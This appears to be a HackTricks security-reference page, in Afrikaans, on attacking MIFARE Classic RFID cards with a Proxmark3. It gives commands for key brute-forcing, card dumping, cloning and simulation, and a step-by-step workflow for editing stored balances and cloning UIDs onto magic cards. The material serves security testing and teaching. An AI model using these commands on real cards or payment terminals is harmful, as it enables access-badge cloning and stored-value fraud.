# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Aanval op RFID-stelsels met Proxmark3

Die eerste ding wat jy moet doen, is om ’n [**Proxmark3**](https://proxmark.com) te hê en [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Aanval op MIFARE Classic 1KB

Dit het **16 sektore**, elk met **4 blokke**, en elke blok bevat **16B**. Die UID is in sektor 0, blok 0 (en kan nie gewysig word nie).\
Om toegang tot elke sektor te verkry, benodig jy **2 sleutels** (**A** en **B**) wat in **blok 3 van elke sektor** (sektor-trailer) gestoor word. Die sektor-trailer stoor ook die **toegangsbits** wat die **lees- en skryftoestemmings** op **elke blok** met behulp van die 2 sleutels bepaal.\
2 sleutels is nuttig om toestemmings te gee om te lees as jy die eerste een ken, en om te skryf as jy die tweede een ken (byvoorbeeld).

Verskeie attacks kan uitgevoer word<sup>[[1]](#references)</sup>.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Die Proxmark3 laat jou toe om ander handelinge uit te voer, soos om ’n **Tag-na-leser-kommunikasie** af te luister om sensitiewe data te probeer vind. In hierdie kaart kan jy die kommunikasie eenvoudig sniff en die gebruikte sleutel bereken, omdat die **kriptografiese bewerkings wat gebruik word swak is** en jy dit kan bereken wanneer jy die gewone teks en syferteks ken (`mfkey64`-tool).<sup>[[3]](#references)</sup>

#### MiFare Classic: vinnige werkvloei vir misbruik van gestoorde waarde

Wanneer terminale saldo’s op Classic-kaarte stoor, is ’n tipiese end-tot-end-werkvloei soos volg:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orkestreer geneste/darkside/HardNested-styl-aanvalle, herwin sleutels en skep dumps in die kliënt se dumps-lêergids.
- Die skryf van blok 0/UID werk slegs op magic gen1a/gen2-kaarte. Normale Classic-kaarte het ’n leesalleen-UID.<sup>[[2]](#references)</sup>
- Baie implementerings gebruik Classic-"waarde-blokke" of eenvoudige checksums. Maak seker dat alle gedupliseerde/gekombineerde velde en checksums konsekwent is nadat dit gewysig is.

Sien ’n metodologie op ’n hoër vlak en versagtingsmaatreëls by:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Rou opdragte

IoT-stelsels gebruik soms **ongemerkte of niekommersiële tags**. In hierdie geval kan jy Proxmark3 gebruik om pasgemaakte **rou opdragte na die tags** te stuur.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Met hierdie inligting kan jy probeer om inligting oor die kaart en oor die manier waarop daarmee gekommunikeer word, te soek. Proxmark3 laat jou toe om raw commands te stuur soos: `hf 14a raw -p -b 7 26`

### Scripts

Die Proxmark3-sagteware kom met ’n voorafgelaaide lys van **outomatiseringskripte** wat jy kan gebruik om eenvoudige take uit te voer. Om die volledige lys te kry, gebruik die `script list`-command. Gebruik vervolgens die `script run`-command, gevolg deur die script se naam:
```
proxmark3> script run mfkeys
```
Jy kan ’n script skep om **tag readers te fuzz**, dus, nadat jy die data van ’n **geldige kaart** gekopieer het, skryf jy net ’n **Lua script** wat een of meer ewekansige **bytes** **randomize** en met elke iterasie kyk of die **reader crash**.

## Verwysings

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
